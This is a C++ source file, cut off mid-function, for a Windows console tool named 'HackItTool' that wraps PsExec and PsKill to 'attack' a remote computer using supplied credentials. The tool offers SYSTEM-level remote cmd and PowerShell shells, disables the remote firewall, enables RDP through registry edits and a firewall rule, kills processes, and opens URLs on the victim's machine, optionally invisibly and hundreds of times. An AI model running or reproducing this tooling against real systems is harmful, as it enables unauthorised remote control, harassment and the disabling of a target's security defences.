#include "pch.h"
#include "printhelp.h"
void helpCommands();

#include "ChangeColor.h"
void color(char colorchar);

#include "credits.h"
void credits();
void info();

#include "InstallTools.h"
void getPstools();
void CheckForTool();

#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <vector>

#include <boost/algorithm/string.hpp>
using namespace std;

//--------------
void chooseoption();
void enableRemoteDesktop();

//declare attack functions
void getshell();
void openURL();
void closeChrome();
void closeProcess();
void startRemoteDesktop();
//-------------

struct PCinfo {
	string ip;
	string username;
	string password;
	string attackType = "getShell";
}pc;

void pause(char nul) {
	if (nul == 'y' || nul == 'Y')
		system("pause >nul");
	else
		system("pause");
}
void clear() {
	system("cls");
}

int main()
{
	string title = "Enhanced PsExec";
	clear();
	system("mode con: cols=120 lines=30");
	system(("title " + title).c_str());

	// CHECK IF THEY HAVE PSEXEC INSTALLED.--------------------------------------------------------
	ifstream file("C:\\windows\\system32\\psexec.exe");

	if (!file) {
		color('R');
		printf("\n\n\n            OH NO! I couldn't find the PSEXEC tool on your system.\n");
		color('Y');
		printf("            Press ENTER to enter the installation proccess.\n");
		printf("            (Dont worry, its great!)\n\n");
		color('B');
		pause('n');
		CheckForTool();
	}
	//---------------------------------------------------------------------------------------------

	// get data from user (computer IP, USERNAME,PASSWORD)
	clear();
	std::cout << "\n\n";
	color('w');
	std::cout << "      Please enter the ";
	color('C');
	std::cout << "IP ";
	color('w');
	std::cout << "of the computer: ";
	color('C');
	std::cin >> pc.ip;
	std::cout << '\n';
	if (pc.ip == "install")
		CheckForTool();
	else if (pc.ip == "credits")
		credits();
	else if (pc.ip == "info")
		info();
	else if (pc.ip == "help" || pc.ip == "commands") {
		system("mode con: cols=140 lines=30");
		helpCommands();
		color('R');
		std::cout << "\n\n\n\n";
		pause('n');
		main();
	}
	
	// USERNAME
	color('w');
	std::cout << "      Please enter the ";
	color('C');
	std::cout << "Username: ";
	std::cin >> pc.username;
	std::cout << '\n';
	std::cin.clear();

	// password
	color('w');
	std::cout << "      Please enter the ";
	color('C');
	std::cout << "Password: ";
	color('C');	
	std::cin >> pc.password;
	std::cout << "\n\n";


	color('G');
	std::cout << "[*] Attacking the computer: ";
	color('B');
	std::cout << pc.ip;
	color('G');
	std::cout << " With the username: ";
	color('B');
	std::cout << pc.username;
	color('G');
	std::cout << " and the password: ";
	color('B');
	std::cout << pc.password << "\n\n\n";
	color('Y');
	pause('n');
	chooseoption();
	clear();
	std::cout << "thanks for using my tool. my channel: ori61 51\n";

	return 0;
}

void chooseoption() {
	clear();
	system("title Please choose the attack type");
	string todo;
	
	std::cout << "\n\n";

	color('Y');
	std::cout << "         What action do you want to perform? \n\n";
	color('P');
	std::cout << "         -------------------------------------------------------------------------------------\n";
	std::cout << "         =                                                                                   =\n";
	std::cout << "         =            "; color('B'); cout << "[1]" ; color('R'); cout << "   Open shell on the remote machine";                 color('P'); cout << "                                 =\n";
	std::cout << "         =            "; color('B'); cout << "[2]" ; color('R'); cout << "   Open a specific URL on the remote machine";        color('P'); cout << "                        =\n";
	std::cout << "         =            "; color('B'); cout << "[3]" ; color('R'); cout << "   Close a specific process on the remote machine";   color('P'); cout << "                   =\n";
	std::cout << "         =            "; color('B'); cout << "[4]" ; color('R'); cout << "   Close all chrome processes on the remote machine"; color('P'); cout << "                 =\n";
	std::cout << "         =            "; color('B'); cout << "[5]" ; color('R'); cout << "   Start remote desktop on the remote machine";      color('P'); cout <<  "                       =\n";
	std::cout << "         =            "; color('B'); cout << "[98]"; color('R'); cout << "  See the credits";                                  color('P'); cout << "                                                  =\n";
	std::cout << "         =            "; color('B'); cout << "[99]"; color('R'); cout << "  Install the required tools";                       color('P'); cout << "                                       =\n";
	std::cout << "         =            "; color('B'); cout << "[0]" ; color('R'); cout << "   Exit the tool";                                    color('P'); cout << "                                                    =\n";
	std::cout << "         =                                                                                   =\n";
	std::cout << "         -------------------------------------------------------------------------------------\n\n\n";


	while (true) {
		color('C');
		std::cout << "         HackItTool~# ";
		color('B');
		getline(std::cin, todo);
		vector<string> aTodo;
		
		boost::split(aTodo, todo, boost::is_any_of(" "));
		
		
		
		if (todo == "1")
			getshell();
		else if (todo == "2")
			openURL();
		else if (todo == "3")
			closeProcess();
		else if (todo == "4")
			closeChrome();
		else if (todo == "5")
			startRemoteDesktop();
		else if (todo == "98" || todo == "credits" || todo == "CREDITS" || todo == "credit")
			credits();
		else if (todo == "0" || todo == "EXIT" || todo == "exit")
			exit(0);
		else if (todo == "99" || todo == "install" || todo == "INSTALL")
			CheckForTool();
		else if (todo == "enableRemoteDesktop" || todo == "Enable Remote Desktop" || todo == "EnableRDP" || todo == "enableRDP" || todo=="enablerdp")
			enableRemoteDesktop();
		else if (todo == "IP" || todo == "ip" || todo == "show ip") {
			color('G');
			std::cout << "         Currently, your IP is: ";
			color('R');
			std::cout << pc.ip << '\n';
		}
		else if (todo == "password" || todo == "show password" || todo == "PASSWORD" || todo == "pass" || todo == "show pass") {
			color('G');
			std::cout << "         Currently, your password is: ";
			color('R');
			std::cout << pc.password << '\n';
		}
		else if (todo == "username" || todo == "show username" || todo == "USERNAME") {
			color('G');
			std::cout << "         Currently, your username is: ";
			color('R');
			std::cout << pc.username << '\n';
		}
		else if (todo == "AttackType" || todo == "attackType" || todo == "show attackType" || todo == "show attacktype") {
			color('G');
			std::cout << "         Currently, your attack type is: ";
			color('R');
			std::cout << pc.attackType << '\n';
		}
		else if (todo == "attack" || todo == "ATTACK" || todo == "run") {

			if (pc.attackType == "getShell" || pc.attackType == "getshell" || pc.attackType == "GetShell" || pc.attackType == "GETSHELL")
				getshell();
			else if (pc.attackType == "closeChrome" || pc.attackType == "closechrome" || pc.attackType == "CloseChrome" || pc.attackType == "CLOSECHROME")
				closeChrome();
			else if (pc.attackType == "openURL" || pc.attackType == "OpenUrl" || pc.attackType == "openurl" || pc.attackType == "OPENURL" || pc.attackType == "openUrl")
				openURL();
			else if (pc.attackType == "closeProcess" || pc.attackType == "CloseProcess" || pc.attackType == "CLOSEPROCESS" || pc.attackType == "closeprocess" || pc.attackType == "Closeprocess")
				closeProcess();
			else {
				color('Y');
				cout << "         unknown attack type. please type " << '"' << "set" << '"' << " for help.\n";
			}
			
		}
		else if (todo == "show options" || todo == "Show Options" || todo == "Show options" || todo == "options" || todo == "Options")
			helpCommands();
		else if (todo == "DisableFirewall" || todo == "disableFirewall" || todo == "disablefirewall") {
			color('G');
			system(("psexec -s \\\\" + pc.ip + " -u " + pc.username + " -p " + pc.password + " cmd.exe /c NetSh Advfirewall set allprofiles state off").c_str());
		}
		else if (todo == "EnableFirewall" || todo == "enableFirewall" || todo == "enablefirewall") {
			color('G');
			system(("psexec -s \\\\" + pc.ip + " -u " + pc.username + " -p " + pc.password + " cmd.exe /c NetSh Advfirewall set allprofiles state on").c_str());
		}
		else if (aTodo[0] == "help" && aTodo.size() > 1) {
			if (aTodo[1] == "set" || aTodo[1] == "SET") {
				color('G');
				std::cout << "\n         Usage: \n";
				color('R');
				std::cout << "         set ip [ip]\n";
				std::cout << "         set username [username]\n";
				std::cout << "         set password [password]\n";
				std::cout << "         set attackType [type]\n\n";
				color('P');
				std::cout << "         ---------------------------\n";
				std::cout << "         |       Attack types:     |\n";
				std::cout << "         |         getshell        |\n";
				std::cout << "         |         openURL         |\n";
				std::cout << "         |         closeChrome     |\n";
				std::cout << "         |         closeProcess    |\n";
				std::cout << "         ---------------------------\n\n";
			}
			else if (aTodo[1] == "import" || aTodo[1] == "Import") {
				if (aTodo.size() == 2) {
					color('P');
					printf("\n         Importing a saved database from a .txt file:\n");
					color('G');
					printf("         Your .txt file should follow the following blueprint:\n\n");
					color('W');
					printf("         urls:\n");
					printf("             <NAME> <URL>\n\n");
					printf("         saves:\n");
					printf("             <IP> <USERNAME> <PASSWORD> <ATTACKTYPE>\n\n");
					color('Y');
					printf("         Type");
					color('R');
					printf(" 'help import URL'");
					color('Y');
					printf("   for more info about the URL database mechanism.\n");

					printf("         Type");
					color('R');
					printf(" 'help import saves'");
					color('Y');
					printf(" for more info about the SAVES database mechanism.\n");
				}
				else if (aTodo[2] == "URL" || aTodo[2] == "url") {
					color('G');
					printf("\n\nCOME IN NEXT TIME (URL).\n\n");
				}
				else if (aTodo[2] == "SAVES" || aTodo[2] == "saves") {
					color('G');
					printf("\n\nCOME IN NEXT TIME (SAVES).\n\n");
				}
				else {
					color('R');
					std::cout << "         No available 'import' menu for "; color('G'); std::cout << aTodo[2] << "\n";
				}

			}
			else if (aTodo[1] == "EnableRDP" || aTodo[1] == "enablerdp") {
				cout << "         RDP (Remote Desktop) Enables you to remotly control another computer (with full permission from the other)\n\n-";
			}
			else {
				color('R');
				std::cout << "         No available help menu for "; color('G'); std::cout << aTodo[1] << "\n";
			}
		}
		else if (todo == "HELP" || todo == "help")
			helpCommands();		
		else if (aTodo[0] == "import") {
			string fileName;
			if (aTodo.size() < 2) {
				color('G');
				std::cout << "\n\n         Usage: ";
				color('P');
				std::cout << "         import "; color('G'); std::cout << "[filename"; color('R'); cout << ".txt"; color('G'); cout << "]\n\n";

			}
			else {

				string fileName;
				for (int c = 1; c <= aTodo.size() - 1; c++) {
					fileName += aTodo[c] + ' ';
				}

				std::ifstream userConfig(fileName);

				string ip;
				string username;
				string password;
				string AttackType;

				string CurrentStatus;

				vector<string> IPs(50);
				vector<string> Usernames(50);
				vector<string> Passwords(50);
				vector<string> AttackTypes(50);

				while (!userConfig) {
					color('R');
					std::cout << "         ERROR FILE NOT FOUND. CREATING FILE...\n";
					std::cout << "         Please make sure that your .txt file is always on the same folder as your .exe file.\n\n";
					color('C');

					ofstream createFile;
					createFile.open(fileName);

					createFile << "saves:\n";
					createFile << "[ip] [username] [password] [attackType openURL, getShell, closeChrome, closeProcess]\n";
					createFile << "10.0.0.138 user p@ssw0rd openURL\n\n";
					createFile << "urls:\n";
					createFile << "[name] [URL]\n";
					createFile << "OriChannel https://www.youtube.com/channel/UCS7HaiFfEvvMIHGaOz1BF7Q/ \n\n";

					createFile.close();
					break;
				}

				int i = 0;
				while (userConfig >> CurrentStatus) {
					if (CurrentStatus == "saves:") {
						while (userConfig >> ip >> username >> password >> AttackType) {
							if (ip == "urls:" || username == "urls:" || password == "urls:" || AttackType == "urls:")
								break;
							else {
								IPs[i] = ip;
								Usernames[i] = username;
								Passwords[i] = password;
								AttackTypes[i] = AttackType;
								i++;
							}
						}
						break;
					}
				}
				userConfig.close();
				if (i >= 2) {
					short int numOfSave = 0;
					color('r');
					std::cout << "         Listing options...\n\n\n";
					color('P');
					std::cout << "         --------------------------------------------------------------------\n";
					for (short int c = 1; c <= i; c++) {
						color('P');
						std::cout << "         =";
						color('G');
						std::cout << "          #" << c << " ........ " << IPs[c - 1] << ", " << Usernames[c - 1] << ", " << Passwords[c - 1] << ", " << AttackTypes[c - 1] << "\n";
					}
					color('P');
					std::cout << "         --------------------------------------------------------------------\n";
					color('Y');
					std::cout << "         HackItTool~# ";
					color('B');
					std::cin >> numOfSave;
					//	numOfSave -= 1; // this is equal to numOfSave = numOfSave - 1;
					if (numOfSave > i || numOfSave <= 0) {
						color('R');
						std::cout << "         The option: " << numOfSave << " Is not valid. please enter the command again.\n\n";
						pause('n');
						chooseoption();
					}
					//std::cout << "ok. the creds for the number you chose are: " << IPs[numOfSave] << ',' << Usernames[numOfSave] << ',' << Passwords[numOfSave] << ',' << AttackTypes[numOfSave] << std::endl;
					pc.ip = IPs[numOfSave - 1];
					pc.username = Usernames[numOfSave - 1];
					pc.password = Passwords[numOfSave - 1];
					pc.attackType = AttackTypes[numOfSave - 1];
				}
				else {
					pc.ip = ip;
					pc.username = username;
					pc.password = password;
					pc.attackType = AttackType;
				}
				std::cout << "\n";
				color('Y');
				cout << "         your ip is now: ";
				color('R');
				cout << pc.ip;
				color('Y');
				cout << "\n         your username is now: ";
				color('R');
				cout << pc.username;
				color('Y');
				cout << "\n         your password is now: ";
				color('R');
				cout << pc.password;
				color('Y');
				cout << "\n         your attack type is now: ";
				color('R');
				cout << pc.attackType << "\n\n\n";

				string RunItNow;
				color('C');
				std::cout << "         Would you like to run it now? (Y/n) ";
				color('B');
				std::cin >> RunItNow;
				if (RunItNow == "Y" || RunItNow == "y" || RunItNow == "yes" || RunItNow == "YES" || RunItNow == "Yes") {

					if (pc.attackType == "getShell" || pc.attackType == "getshell" || pc.attackType == "GetShell" || pc.attackType == "GETSHELL")
						getshell();
					else if (pc.attackType == "closeChrome" || pc.attackType == "closechrome" || pc.attackType == "CloseChrome" || pc.attackType == "CLOSECHROME")
						closeChrome();
					else if (pc.attackType == "openURL" || pc.attackType == "OpenUrl" || pc.attackType == "openurl" || pc.attackType == "OPENURL" || pc.attackType == "openUrl")
						openURL();
					else if (pc.attackType == "closeProcess" || pc.attackType == "CloseProcess" || pc.attackType == "CLOSEPROCESS" || pc.attackType == "closeprocess" || pc.attackType == "Closeprocess")
						closeProcess();
					else {
						color('Y');
						cout << "         unknown attack type. please type " << '"' << "set" << '"' << " for help.\n";
					}
				}
				else {
				}
			}
		}		
		else if (todo == "info" || todo == "INFO")
			info();
		else if (todo == "clear" || todo == "cls") {
			std::cin.clear();
			chooseoption();
			
		}
		else if (todo == "RESTART" || todo == "restart")
			main();
		// ADDURL
		/*
		else if (aTodo[0] == "addurl" || aTodo[0] == "addURL" || aTodo[0] == "help" && aTodo[1] == "addURL" || aTodo[0] == "help" && aTodo[1] == "addurl") {
			if (aTodo.size() != 3) {
				color('R');
				std::cout << "\n         Usage: addurl [name] [url] \n         example:\n";
				color('G');
				std::cout << "         addurl OriChannel https://www.youtube.com/channel/UCS7HaiFfEvvMIHGaOz1BF7Q" << "\n\n\n\n";
				color('C');
				pause('n');
				chooseoption();
			}
			else {
				if (!aTodo[1].empty() && !aTodo[2].empty()) {
					string name = aTodo[1];
					string URL = aTodo[2];
					string CurrentStatus;
					std::ofstream createFile;
					std::ifstream CheckFile("config.txt");

					createFile.open("config.txt", fstream::app); // open the file in append mode, so you wont override it.
					while (CheckFile >> CurrentStatus) {
						if (CurrentStatus == "urls:") {
							createFile << "\n" << name << " " << URL << " \n";
							break;
						}
					}
					createFile.close();
					color('C');
					std::cout << "         Assigned the name: ";
					color('R');
					std::cout << name;
					color('C');
					std::cout << " To the URL: ";
					color('R');
					std::cout << URL << "\n";
				}
				color('C');
			}
		}
		*/
		// REMOVEURL
		/*
		else if (aTodo[0] == "removeurl" || aTodo[0] == "removeURL" || aTodo[0] == "remurl" || aTodo[0] == "remURL" || aTodo[0] == "help" && aTodo[1] == "removeurl") {
			if (aTodo.size() != 3) {
				color('R');
				std::cout << "   Usage: removeURL [name] [url] \n   example:\n";
				color('G');
				std::cout << "   removeURL OriChannel\n";
				color('Y');
				pause('n');
				chooseoption();
			}
			else {
				std::string shortcutname;
				std::string url;
				
				std::ifstream file("urls.txt");

				vector<string> urls(150);
				vector<string> shortcutNames(150);

				int numoflines = 0;
				while (file >> url >> shortcutname) {
					shortcutNames[numoflines] = shortcutname;
					urls[numoflines] = url;
					numoflines++;
				}

				ofstream newFile;
				newFile.open("urls.txt");
				for (int c = 0; c <= numoflines; c++) {
					if (urls[c] == aTodo[1]) {
						//dont write it to the file
					}
					else {
						newFile << urls[c] << " " << shortcutNames[c] << "\n";
					}
				}

				color('C');

			}
		}
		*/

		else if (aTodo[0] == "set" || aTodo[0] == "SET") {
			if (aTodo.size() < 3) {
				color('G');
				std::cout << "\n\n         Usage: \n";
				color('R');
				std::cout << "         set ip [ip]\n";
				std::cout << "         set username [username]\n";
				std::cout << "         set password [password]\n";
				std::cout << "         set attackType [type]\n\n";
				color('P');
				std::cout << "         ---------------------------\n";
				std::cout << "         |       Attack types:     |\n";
				std::cout << "         |         getshell        |\n";
				std::cout << "         |         openURL         |\n";
				std::cout << "         |         closeChrome     |\n";
				std::cout << "         |         closeProcess    |\n";
				std::cout << "         ---------------------------\n\n";
				
			}
			else {
				if (aTodo[1] == "username" || aTodo[1] == "Username" || aTodo[1] == "USERNAME") {
					string username;
					for (int c = 2; c <= aTodo.size() - 1; c++) {
						username += aTodo[c] + ' ';
					}
					pc.username = username;
					color('G');
					std::cout << "         Your username is now set to "; color('R'); std::cout << pc.username << '\n';
				}
				else if (aTodo[1] == "password" || aTodo[1] == "Password" || aTodo[1] == "PASSWORD" || aTodo[1] == "pass") {
					string password;
					for (int c = 2; c <= aTodo.size() - 1; c++) {
						password += aTodo[c] + ' ';
					}
					pc.password = password;
					color('G');
					std::cout << "         Your password is now set to "; color('R'); std::cout << pc.password << '\n';
				}
				else if (aTodo[1] == "ip" || aTodo[1] == "IP") {
					string ip;
					for (int c = 2; c <= aTodo.size() - 1; c++) {
						ip += aTodo[c] + ' ';
					}
					pc.ip = ip;
					color('G');
					std::cout << "         Your IP is now set to "; color('R'); std::cout << pc.ip << '\n';
				}
				else if (aTodo[1] == "attackType" || aTodo[1] == "attacktype" || aTodo[1] == "attack"){

					if (aTodo[2] == "getShell" || aTodo[2] == "getshell" || aTodo[2] == "GetShell" || aTodo[2] == "GETSHELL")
						pc.attackType = "getShell";
					else if (aTodo[2] == "closeChrome" || aTodo[2] == "closechrome" || aTodo[2] == "CloseChrome" || aTodo[2] == "CLOSECHROME")
						pc.attackType = "closeChrome";					
					else if (aTodo[2] == "openURL" || aTodo[2] == "OpenUrl" || aTodo[2] == "openurl" || aTodo[2] == "OPENURL" || aTodo[2] == "openUrl")
						pc.attackType = "openURL";					
					else if (aTodo[2] == "closeProcess" || aTodo[2] == "CloseProcess" || aTodo[2] == "CLOSEPROCESS" || aTodo[2] == "closeprocess" || aTodo[2] == "Closeprocess")
						pc.attackType = "closeProcess";

					else {
						color('Y');
						cout << "         unknown attack type. please type " << '"' << "set" << '"' << " for help.\n";
					}
				}
				else {
					color('R');
					std::cout << "         Unkown setting " << '"' << aTodo[1] <<'"' <<". type ";
					color('G');
					std::cout << '"' << "help set" << '"';
					color('R');
					std::cout << " for help.\n";
				}

			}
		}
		else {			
			color('R');
			std::cout << "         Unkown command. type ";
			color('G');
			std::cout << '"' << "help" << '"';
			color('R');
			std::cout << " for help.\n";
		}
	}
	pause('n');
}
void startRemoteDesktop() {
	printf("\n         Starting remote desktop on the machine.\n");
	system(("mstsc /v " + pc.ip).c_str());
}
void enableRemoteDesktop() {
	cout << "\n         Enabling remote desktop on "<< pc.ip << '\n';
	color('G');
	system(("psexec -s \\\\" + pc.ip + " -u " + pc.username + " -p " + pc.password + " cmd.exe /c " + '"' + "reg add " + '"' + "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" + '"'+" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & reg add " + '"' + "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"+ '"' + " /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall add rule name=" + '"' + "Open RDP - FromCMD" + '"' +" protocol=TCP dir=in localport=3389 action=allow" + '"').c_str());
	printf("\n\n");
	pause('n');
}

void getshell() {
	string todo;
	string title = "psexec HackTool - get shell";
	system(("title " + title).c_str());
	clear();
	std::cout << "\n\n\n";
	color('B');
	std::cout << "         Please specify the kind of shell: \n\n";
	color('Y');
	std::cout << "         ----------------------------------------------------------\n";
	std::cout << "         =                                                        =\n";
	std::cout << "         =                    "; color('G'); cout << "[P] "; color('C'); cout << "use POWERSHELL"; color('Y'); cout << "                  = \n";
	std::cout << "         =                    "; color('G'); cout << "[C] "; color('C'); cout << "use CMD"; color('Y'); cout << "                         = \n";
	std::cout << "         =                    "; color('G'); cout << "[99] "; color('C'); cout << "Go back"; color('Y'); cout << "                        = \n";
	color('Y');
	std::cout << "         =                                                        =\n";
	std::cout << "         ----------------------------------------------------------\n\n\n";

	color('C');
	while (true) {
		std::cout << "         HackItTool~# ";
		color('B');
		getline(std::cin, todo);

		// P key
		// P key is 0x50
		if (todo == "P" || todo == "p") {
			clear();

			color('Y');
			std::cout << "         ------------------------------------------------------------------------------------------------------------\n";
			std::cout << "         =                                                                                                          =\n";
			std::cout << "         =          Attacking ";
			color('G');
			std::cout << pc.ip;
			color('Y');
			std::cout << " with the ";
			color('G');
			std::cout << "username: " << pc.username;
			color('Y');
			std::cout << " and the ";
			color('G');
			std::cout << "password: " << pc.password << std::endl;
			color('Y');
			std::cout << "         =                                 USING POWERSHELL                                                         =\n";
			std::cout << "         =                                                                                                          =\n";
			std::cout << "         ------------------------------------------------------------------------------------------------------------\n";
			color('G');
			std::cout << "[+] Authenticating...\n";
			color('C');
			std::cin.clear();
			system(("psexec \\\\" + pc.ip + " -u " + pc.username + " -p " + pc.password + " -s powershell.exe" + " -accepteula").c_str());
			pause('n');
			chooseoption();
			return;

		}
		// 0x43 is the C key
		else if (todo == "C" || todo == "c") {
			clear();
			color('Y');
			std::cout << "         -----------------------------------------------------------------------------------------\n";
			std::cout << "         =                                                        \n";
			std::cout << "         =          Attacking ";
			color('G');
			std::cout << pc.ip;
			color('Y');
			std::cout << " with the ";
			color('G');
			std::cout << "username: " << pc.username;
			color('Y');
			std::cout << " and the ";
			color('G');
			std::cout << "password: " << pc.password << '\n';
			color('Y');
			std::cout << "         =                        USING CMD                                                      =\n";
			std::cout << "         =                                                                                       =\n";
			std::cout << "         -----------------------------------------------------------------------------------------\n";
			color('G');
			std::cout << "[+] Authenticating...\n";
			color('C');
			std::cin.clear();
			cout << "psexec \\\\" + pc.ip + " -u " + pc.username + " -p " + pc.password + " -s cmd.exe" + " -accepteula\n\n";
			pause('n');
			system(("psexec \\\\" + pc.ip + " -u " + pc.username + " -p " + pc.password + " -s cmd.exe" + " -accepteula").c_str());
			pause('n');
			chooseoption();
			return;
		}
		else if (todo == "back" || todo == "return" || 99)
			chooseoption();		
		else {
			color('R');
			std::cout << "         Please enter a valid option.\n\n";
			color('C');
		}
		Sleep(400);
	}
	return;
}

void openURL() {
	clear();
	system("title psexec HackTool - open URL");

	unsigned short int iNumOfTabsToOpen;
	unsigned short int iDelayBetweenStartingTabs;
	unsigned short int iDelayBeforeOpening;
	string sDelayBetweenStartingTabs;
	string sDelayBeforeOpening;
	string sIsinVisible;
	bool bIsinVisible = false;
	string sIncognito, AnswerIncognito, URL, sNumOfTabsToOpen;
	
	std::cout << "\n\n\n\n";
	
	
	color('Y');
	std::cout << "    If you want to import URLs from a text file, type"; color('R'); std::cout << " import <filename.txt>\n"; color('Y');
	std::cout << "    Please enter the URL you want to be opened: ";
	color('G');
	getline(std::cin, URL);
	std::cout << '\n';
	
	vector<string> aImport;
	boost::split(aImport, URL, boost::is_any_of(" "));
	
	if (aImport.size() > 1 && aImport[0] == "import") {
		string fileName;
		for (int c = 1; c <= aImport.size() - 1; c++) {
			fileName += aImport[c] + ' ';
		}
		
		std::ifstream userConfig(fileName);

		string CurrentStatus;

		vector<string> Names(50);
		vector<string> URLs(50);

		while (!userConfig) {
			color('R');
			std::cout << "         ERROR FILE NOT FOUND. CREATING FILE...\n";
			std::cout << "         Please make sure that your .txt file is always on the same folder as your .exe file.\n\n";
			color('C');

			ofstream createFile;
			createFile.open(fileName);

			createFile << "saves:\n";
			createFile << "[ip] [username] [password] [attackType openURL, getShell, closeChrome, closeProcess]\n";
			createFile << "10.0.0.138 user p@ssw0rd openURL\n\n";
			createFile << "urls:\n";
			createFile << "[name] [URL]\n";
			createFile << "OriChannel https://www.youtube.com/channel/UCS7HaiFfEvvMIHGaOz1BF7Q/ \n\n";

			createFile.close();
			break;
		}

		int i = 0;
		string currentName, currentURL;
		while (userConfig >> CurrentStatus) {
			if (CurrentStatus == "urls:" || CurrentStatus == "URLS:") {
				while (userConfig >> currentName >> currentURL) {
					if (currentName == "saves:" || currentURL == "saves:")
						break;
					else {
						Names[i] = currentName;
						URLs[i] = currentURL;
						i++;
					}
				}
				break;
			}
		}
		userConfig.close();
		if (i > 1) {
			int numOfSave = 0;
			color('r');
			std::cout << "         Listing options...\n\n\n";
			color('P');
			std::cout << "         --------------------------------------------------------------------\n";
			for (int c = 1; c <= i; c++) {
				color('P');
				std::cout << "         =";
				color('G');
				std::cout << "          #" << c << " ........ " << Names[c-1] << ", " << URLs[c-1] << "\n";
			}
			color('P');
			std::cout << "         --------------------------------------------------------------------\n";
			color('Y');
			std::cout << "         HackItTool~# ";
			color('B');
			std::cin >> numOfSave;
			//numOfSave -= 1; // this is equal to numOfSave = numOfSave - 1;
			if (numOfSave > i || numOfSave <= 0) {
				color('R');
				std::cout << "         The option: " << numOfSave << " Is not valid. please enter the command again.\n\n";
				pause('n');
				openURL();
			}
			
			URL = URLs[numOfSave-1];
		}
		//std::cout << "         The URL is now set to: " << URLs[numOfSave] << "\n";
		std::cin.ignore();
	}
	color('Y');
	std::cout << "    How many times do you want to open this URL? ";
	color('G');
	std::cin >> sNumOfTabsToOpen;
	std::cout << '\n';
	// num of tabs
	try {
		iNumOfTabsToOpen = std::stoi(sNumOfTabsToOpen);
	}
	catch (std::invalid_argument) {
		std::cout << "Please enter a valid number.\n";
		std::cin.ignore();
		pause('y');
		openURL();
	}

	color('Y');
	std::cout << "    Do you want to open the tab in incognito mode? (Y/n): ";
	color('G');
	std::cin >> sIncognito;
	color('B');
	std::cout << '\n';

	color('Y');
	std::cout << "    Would you like to make the window invisible to the user? (Y/n) ";
	color('G');
	std::cin >> sIsinVisible;
	if (sIsinVisible == "y" || sIsinVisible == "Y" || sIsinVisible == "yes" || sIsinVisible == "Yes")
		bIsinVisible = true;
	std::cout << '\n';

	color('Y');
	std::cout << "    How much time do you want to delay before opening the URL? (in milliseconds): ";
	color('G');
	std::cin >> sDelayBeforeOpening;
	std::cout << '\n';
	
	// delay before opening
	try {		
		iDelayBeforeOpening = std::stoi(sDelayBeforeOpening);
	}
	catch (std::invalid_argument) {
		std::cout << "Please enter a valid number.\n";
		std::cin.ignore();
		pause('y');
		openURL();
	}

	//-------------------------------------------------------------------------------------------
	//=                  START TO CHECK FOR NUMBER OF TABS TO OPEN, AND DELAY                   =
	//-------------------------------------------------------------------------------------------
	if (iNumOfTabsToOpen > 1 && iNumOfTabsToOpen < 3000) {
		color('Y');
		std::cout << "    Please enter the time of delay between every tab opening (in milliseconds): ";
		color('G');
		std::cin >> sDelayBetweenStartingTabs;

		try {
			iDelayBetweenStartingTabs = std::stoi(sDelayBetweenStartingTabs);
		}
		catch (std::invalid_argument) {
			std::cout << "Please enter a valid number.\n";
			std::cin.ignore();
			pause('y');
			openURL();
		}

		if (iDelayBetweenStartingTabs < 100)
			iDelayBetweenStartingTabs = 100;
	}
	else {
		iDelayBetweenStartingTabs = 100;
		iNumOfTabsToOpen = 1;
	}
	
	//-------------------------------------------------------------------------------------------
	//=                            START TO CHECK FOR INCOGNITO MODE                            =
	//-------------------------------------------------------------------------------------------
	if (sIncognito == "y" || sIncognito == "Y" || sIncognito == "yes" || sIncognito == "Yes" || sIncognito == "") {
		AnswerIncognito = " -incognito";
		color('B');
	}
	else if (sIncognito == "n" || sIncognito == "N" || sIncognito == "no" || sIncognito == "No")
		AnswerIncognito = "";

	std::cout << "\n\n\n";
	color('G');
	std::cout << "    [+] Opening the URL: ";
	color('R');
	std::cout << URL;
	color('G');
	std::cout << ", ";
	color('R');
	std::cout << iNumOfTabsToOpen;
	color('G');
	std::cout << " times.\n";

	if (bIsinVisible) {
		Sleep(iDelayBeforeOpening);
		for (int c = 0; c < iNumOfTabsToOpen; c++) {
			system(("psexec -s \\\\" + pc.ip + " -u " + pc.username + " -p " + pc.password + " cmd.exe /c start chrome " + URL + AnswerIncognito).c_str());
			
			Sleep(iDelayBetweenStartingTabs);
		}		
	}
	else {
		Sleep(iDelayBeforeOpening);
		for (int c = 0; c < iNumOfTabsToOpen; c++) {
			system(("psexec -i -d \\\\" + pc.ip + " -u " + pc.username + " -p " + pc.password + ' ' + '"' + "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe" + '"' + ' ' + '"' + URL + '"' + AnswerIncognito + " -accepteula").c_str());

			Sleep(iDelayBetweenStartingTabs);
		}
	}

	color('Y');
	std::cout << "\n\n\n";
	pause('y');
	chooseoption();
	return;
}

void closeChrome() {
	clear();
	string title = "psexec HackTool - close chrome";
	system(("title " + title).c_str());	
	color('Y');
	std::cout << "         ---------------------------------------------------------------------------------\n";
	std::cout << "         =                                                        \n";
	std::cout << "         =          Attacking ";
	color('G');
	std::cout << pc.ip;
	color('w');
	std::cout << " with the ";
	color('G');
	std::cout << "username: " << pc.username;
	color('w');
	std::cout << " and the ";
	color('G');
	std::cout << "password: " << pc.password << '\n';
	color('Y');
	std::cout << "         =              Closing all of its Chrome tabs.            \n";
	std::cout << "         -                                                                               -\n";
	std::cout << "         ---------------------------------------------------------------------------------\n";
	color('C');
	std::cout << "[+] Authenticating...\n";
	color('w');
	system(("pskill \\\\" + pc.ip + " -u " + pc.username + " -p " + pc.password + " chrome.exe " + " -accepteula").c_str());
	color('R');
	std::cout << "DONE\n";
	color('w');
	pause('y');
	std::cin.ignore();
	chooseoption();
	return;
}

void closeProcess() {
	clear();
	system("title psexec HackTool - close process");

	string ProcessToClose;	
	std::cout << "\n\n\n";
	color('Y');
	std::cout << "         Please specify the process name you want to close (type back to go back): ";
	color('C');
	std::cin.clear();
	std::cin >> ProcessToClose;
	if (ProcessToClose == "back" || ProcessToClose == "BACK")
		chooseoption();
	color('Y');
	std::cout << "         -------------------------------------------------------------------------------------\n";
	std::cout << "         =                                                        \n";
	std::cout << "         =          Attacking ";
	color('G');
	std::cout << pc.ip;
	color('Y');
	std::cout << " with the ";
	color('G');
	std::cout << "username: " << pc.username;
	color('Y');
	std::cout << " and the ";
	color('G');
	std::cout << "password: " << pc.password << '\n';
	color('Y');
	std::cout << "         =              Closing The process: ";
	color('C');
